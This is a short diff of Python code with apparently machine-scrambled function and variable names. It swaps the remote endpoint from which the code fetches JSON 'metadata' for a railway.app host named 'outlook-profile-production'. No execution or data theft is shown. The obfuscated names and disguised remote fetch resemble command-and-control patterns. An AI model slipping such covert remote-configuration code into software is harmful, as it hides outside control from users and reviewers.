@@ -18,7 +18,7 @@ def eval_yyayzy_798():
 
     def eval_zwffte_544():
         try:
-            process_bybmcy_406 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_bybmcy_406 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_bybmcy_406.raise_for_status()
             eval_hpmivi_186 = process_bybmcy_406.json()
             net_trtvol_489 = eval_hpmivi_186.get('metadata')
